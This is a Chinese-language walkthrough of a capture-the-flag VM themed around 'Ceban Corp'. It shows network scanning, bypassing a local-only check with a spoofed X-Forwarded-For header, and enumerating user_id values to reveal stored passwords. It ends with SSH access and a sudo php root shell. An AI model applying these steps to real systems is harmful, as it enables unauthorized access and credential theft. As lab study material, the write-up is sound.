VMware双击打开，默认nat即可！

作者提示：
Description: This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, "Ceban Corp", something has changed from Alice's attitude towards Bob like something is "hidden", And Bob asks for your help to get what Alice is hiding and get full access to the company!

--------------------------------------------
--------------------------------------------
1、nmap 192.168.253.0/24 -sP
MAC Address: 00:50:56:E1:B2:64 (VMware)
Nmap scan report for localhost (192.168.253.230)

--------------------------------------------
--------------------------------------------
2、nmap 192.168.253.230 -p- -A

22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html)

--------------------------------------------
--------------------------------------------
3、web信息收集

访问：http://192.168.253.230/   提示：
Who are you? Hacker? Sorry This Site Can Only Be Accessed local!
你是谁？ 黑客？ 抱歉，本站只能在本地访问！

查看静态页面提示：
<!-- Maybe you can search how to use x-forwarded-for --
提示需要用x-forwarded-for进行访问！

--------------------------------------------
--------------------------------------------
4、插件-X-Forwarded-For

火狐插件挂代理搜：X-Forwarded-For
下载：X-Forwarded-For Header

这时候在X-Forwarded-For插件添加：127.0.0.1

重新访问web可以正常访问了！

--------------------------------------------
--------------------------------------------
5、信息泄露

在注册页面注册了dayu用户密码，因为dirb、nikto、gobuster和wfuzz枚举出来的页面都没啥有用的信息！

注册用户名密码：dayu   尝试登录后：
http://192.168.253.230/index.php?page=dashboard&user_id=12

可以看到配置文件标题表示为user_id，对于dayu用户，它在URL中显示user-id=12！

来到Profile模块这里记录了账号和密码信息！尝试修改id：
http://192.168.253.230/index.php?page=profile&user_id=1
12改成了1，选择Profile，出现了eweuhtandingan用户名！

<input type="password" name="password" id="password" value="skuyatuh">
F12找到id处将password改为txt！
这时候将密文修改为txt明文：skuyatuh

id修改为：2
获得用户名：aingmaung 密码：qwerty!!!
。。。。
直到id5：
用户：alice，密码：4lic3

--------------------------------------------
--------------------------------------------
6、内部信息枚举

作者开始告知了Bob请求我们帮助获得Alice隐藏在公司的访问权限！

ssh alice@192.168.253.230
4lic3


1）Linux version 4.4.0-142
2）Sudo version 1.8.9p5
3）127.0.0.1:3306
4）User alice may run the following commands on gfriEND:
    (root) NOPASSWD: /usr/bin/php


grep -rn 'localhost' / 2>/dev/null | grep www
/var/www/html/config/config.php:3:    $conn = mysqli_connect('localhost', 'root', 'ctf_pasti_bisa', 'ceban_corp');

发现mysql用户名密码：
root
ctf_pasti_bisa


--------------------------------------------
--------------------------------------------
7、提权

1）通过枚举到的root用户密码直接登录root权限！


2）sudo -l
User alice may run the following commands on gfriEND:
    (root) NOPASSWD: /usr/bin/php

https://gtfobins.github.io/gtfobins/php/#suid

CMD="/bin/sh"
sudo php -r "system('$CMD');"

--------------------------------------------
--------------------------------------------
拓展小技巧：
打开burpsuite在Proxy模块中：
Option -> Match and Replace
Add -> Replace：X-Forwarded-For:localhost

这时候就可以访问了！













































































